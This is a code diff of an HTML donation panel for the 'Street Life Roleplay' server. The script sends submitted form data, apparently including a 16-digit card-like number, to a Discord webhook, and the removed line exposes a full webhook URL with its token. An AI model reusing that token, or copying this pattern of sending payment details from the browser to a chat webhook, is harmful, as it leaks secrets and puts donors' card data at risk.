@@ -1,121 +1,106 @@
-<html><head><base href="no cache">
-<meta charset="UTF-8">
-<title>Street Life Roleplay - Donation Panel</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
-
-  * {
-    margin: 0;
-    padding: 0;
-    box-sizing: border-box;
-    font-family: 'Poppins', sans-serif;
-  }
-
-  body {
-    background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
-    min-height: 100vh;
-    display: flex;
-    justify-content: center;
-    align-items: center;
-    color: white;
-  }
-
-  .container {
-    background: rgba(255, 255, 255, 0.1);
-    backdrop-filter: blur(10px);
-    padding: 2rem;
-    border-radius: 15px;
-    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
-    width: 90%;
-    max-width: 500px;
-  }
-
-  .logo {
-    text-align: center;
-    margin-bottom: 2rem;
-  }
-
-  .server-name {
-    font-size: 2.5rem;
-    background: linear-gradient(45deg, #FFD700, #FFA500);
-    -webkit-background-clip: text;
-    -webkit-text-fill-color: transparent;
-    margin-bottom: 0.5rem;
-  }
-
-  .form-group {
-    margin-bottom: 1.5rem;
-  }
-
-  label {
-    display: block;
-    margin-bottom: 0.5rem;
-    font-weight: 500;
-  }
-
-  input, textarea {
-    width: 100%;
-    padding: 0.8rem;
-    border: none;
-    background: rgba(255, 255, 255, 0.1);
-    border-radius: 8px;
-    color: white;
-    font-size: 1rem;
-    transition: all 0.3s ease;
-  }
-
-  input:focus, textarea:focus {
-    outline: none;
-    background: rgba(255, 255, 255, 0.2);
-  }
-
-  button {
-    width: 100%;
-    padding: 1rem;
-    background: linear-gradient(45deg, #FFD700, #FFA500);
-    border: none;
-    border-radius: 8px;
-    color: #1a1a1a;
-    font-weight: 600;
-    font-size: 1.1rem;
-    cursor: pointer;
-    transition: transform 0.3s ease;
-  }
-
-  button:hover {
-    transform: translateY(-2px);
-  }
-
-  .success-message {
-    display: none;
-    text-align: center;
-    color: #4CAF50;
-    margin-top: 1rem;
-  }
-
-  .loading {
-    display: none;
-    text-align: center;
-    margin-top: 1rem;
-  }
-
-  .loading span {
-    display: inline-block;
-    width: 10px;
-    height: 10px;
-    background: #FFD700;
-    border-radius: 50%;
-    margin: 0 3px;
-    animation: bounce 0.5s infinite alternate;
-  }
-
-  .loading span:nth-child(2) { animation-delay: 0.1s; }
-  .loading span:nth-child(3) { animation-delay: 0.2s; }
-
-  @keyframes bounce {
-    to { transform: translateY(-10px); }
-  }
-</style>
+<html>
+<head>
+  <meta charset="UTF-8">
+  <title>Street Life Roleplay - Donation Panel</title>
+  <style>
+    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap');
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: 'Poppins', sans-serif;
+    }
+    body {
+      background: linear-gradient(135deg, #1a1a1a, #2d2d2d);
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      color: white;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.1);
+      backdrop-filter: blur(10px);
+      padding: 2rem;
+      border-radius: 15px;
+      box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+      width: 90%;
+      max-width: 500px;
+    }
+    .logo {
+      text-align: center;
+      margin-bottom: 2rem;
+    }
+    .server-name {
+      font-size: 2.5rem;
+      background: linear-gradient(45deg, #FFD700, #FFA500);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+      margin-bottom: 0.5rem;
+    }
+    .form-group {
+      margin-bottom: 1.5rem;
+    }
+    label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+    }
+    input, textarea {
+      width: 100%;
+      padding: 0.8rem;
+      border: none;
+      background: rgba(255, 255, 255, 0.1);
+      border-radius: 8px;
+      color: white;
+      font-size: 1rem;
+      transition: all 0.3s ease;
+    }
+    input:focus, textarea:focus {
+      outline: none;
+      background: rgba(255, 255, 255, 0.2);
+    }
+    button {
+      width: 100%;
+      padding: 1rem;
+      background: linear-gradient(45deg, #FFD700, #FFA500);
+      border: none;
+      border-radius: 8px;
+      color: #1a1a1a;
+      font-weight: 600;
+      font-size: 1.1rem;
+      cursor: pointer;
+      transition: transform 0.3s ease;
+    }
+    button:hover {
+      transform: translateY(-2px);
+    }
+    .success-message {
+      display: none;
+      text-align: center;
+      color: #4CAF50;
+      margin-top: 1rem;
+    }
+    .loading {
+      display: none;
+      text-align: center;
+      margin-top: 1rem;
+    }
+    .loading span {
+      display: inline-block;
+      width: 10px;
+      height: 10px;
+      background: #FFD700;
+      border-radius: 50%;
+      margin: 0 3px;
+      animation: bounce 0.5s infinite alternate;
+    }
+    .loading span:nth-child(2) { animation-delay: 0.1s; }
+    .loading span:nth-child(3) { animation-delay: 0.2s; }
+    @keyframes bounce {
+      to { transform: translateY(-10px); }
+    }
+  </style>
 </head>
 <body>
   <div class="container">
@@ -123,7 +108,7 @@
       <h1 class="server-name">Street Life Roleplay</h1>
       <p>🌟 Donation Panel</p>
     </div>
-    
+
     <form id="donationForm">
       <div class="form-group">
         <label for="username">Discord Username</label>
@@ -151,7 +136,8 @@
   </div>
 
   <script>
-    const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1320826444363857980/zSFnR0X7CiCElWKtgTJYXD0LPCCX5XGQQMEWBF59y6-gdp7J1yUg9yRy2kM0-pQIVCq-';
+    // Make sure to replace the real webhook URL with a secure environment variable
+    const DISCORD_WEBHOOK_URL = 'webhook'; // Replace with secret environment variable or backend handler
 
     document.getElementById('donationForm').addEventListener('submit', async (e) => {
       e.preventDefault();
@@ -161,7 +147,7 @@
 
       // Show loading animation
       document.querySelector('.loading').style.display = 'block';
-      
+
       // Prepare the embed for Discord
       const embed = {
         title: '🌟 New Donation Received!',
@@ -218,4 +204,5 @@
       e.target.value = e.target.value.replace(/[^\d]/g, '').slice(0, 16);
     });
   </script>
-</body></html>
+</body>
+</html>
